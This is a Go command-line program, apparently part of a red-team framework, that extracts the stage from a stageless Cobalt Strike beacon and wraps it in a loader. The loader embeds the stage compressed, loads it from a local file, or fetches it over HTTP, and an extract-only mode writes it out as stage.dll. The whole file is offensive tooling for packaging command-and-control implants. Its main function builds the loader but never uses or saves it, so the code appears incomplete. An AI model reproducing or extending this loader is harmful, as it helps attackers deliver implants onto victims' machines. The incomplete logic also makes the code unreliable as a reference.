package main

import (
	"bytes"
	"debug/pe"
	"flag"
	"fmt"
	"log"
	"os"
	"path/filepath"

	"github.com/For-ACGN/LZSS"

	"github.com/RTS-Framework/GRT-Develop/instance"
	"github.com/RTS-Framework/GRT-MXLoader/loader"
	"github.com/RTS-Framework/GRT-MXLoader/loader/cs-beacon"
)

var (
	extract bool
	tplDir  string
	mode    string
	arch    string

	embedOpts loader.EmbedOptions
	httpOpts  loader.HTTPOptions
	options   beacon.Options

	input  string
	output string
)

func init() {
	flag.BoolVar(&extract, "so", false, "extract beacon stage only")
	flag.StringVar(&tplDir, "tpl", "", "set custom templates directory")
	flag.StringVar(&mode, "mode", "", "select the load mode: embed, file and http")
	flag.StringVar(&arch, "arch", "amd64", "set template architecture")
	flag.StringVar(&options.Version, "ver", "", "specify the version, default is 4.0")
	flag.BoolVar(&embedOpts.Compress, "compress", false, "compress image when use embed mode")
	flag.BoolVar(&embedOpts.PreCompressed, "precompressed", false, "set it is a pre-compressed image")
	flag.DurationVar(&httpOpts.ConnectTimeout, "timeout", 0, "set the timeout when use http mode")
	flag.StringVar(&input, "i", "", "stageless beacon source path")
	flag.StringVar(&output, "o", "", "save output file path")
	instance.Flag(&options.Runtime)
	flag.Parse()
}

func main() {
	if input == "" {
		flag.Usage()
		return
	}
	if extract {
		extractStage()
		return
	}

	// load custom template
	var (
		ldrX64 []byte
		ldrX86 []byte
	)
	if tplDir != "" {
		fmt.Println("load custom templates")
		var err error
		ldrX64, err = os.ReadFile(filepath.Join(tplDir, "CS_Beacon_x64.bin")) // #nosec
		checkError(err)
		ldrX86, err = os.ReadFile(filepath.Join(tplDir, "CS_Beacon_x86.bin")) // #nosec
		checkError(err)
	}

	// create image with different mode
	var image loader.Payload
	switch mode {
	case "embed":
		fmt.Println("use embed image mode")
		fmt.Println("parse PE image file")
		data, err := os.ReadFile(input) // #nosec
		checkError(err)
		peFile, err := pe.NewFile(bytes.NewReader(data))
		checkError(err)
		switch peFile.Machine {
		case pe.IMAGE_FILE_MACHINE_I386:
			arch = "386"
			fmt.Println("image architecture: x86")
		case pe.IMAGE_FILE_MACHINE_AMD64:
			arch = "amd64"
			fmt.Println("image architecture: x64")
		default:
			fmt.Println("unknown pe image architecture type")
			return
		}
		fmt.Println("extract stage in beacon image")
		stage, err := beacon.ExtractStage(options.Version, data)
		checkError(err)
		if embedOpts.Compress {
			embedOpts.WindowSize = lzss.MaximumWindowSize
			embedOpts.ChainLen = lzss.MaximumChainLen

			fmt.Println("enable PE image compression")
			s := (len(stage) / (4 * 1024 * 1024)) + 1
			fmt.Printf("please wait for about %d seconds for compress\n", s)
		}
		image = loader.NewEmbed(stage, &embedOpts)
	case "file":
		fmt.Println("use local file mode")
		image = loader.NewFile(input)
	case "http":
		fmt.Println("use http mode")
		image = loader.NewHTTP(input, &httpOpts)
	default:
		fmt.Println("unknown load mode")
		return
	}

}

func extractStage() {
	image, err := os.ReadFile(input) // #nosec
	checkError(err)
	stage, err := beacon.ExtractStage(options.Version, image)
	checkError(err)
	if output == "" {
		output = "stage.dll"
	}
	err = os.WriteFile(output, stage, 0600) // #nosec
	checkError(err)
	fmt.Println("extract Cobalt-Strike beacon stage successfully")
}

func checkError(err error) {
	if err != nil {
		log.Fatalln(err)
	}
}
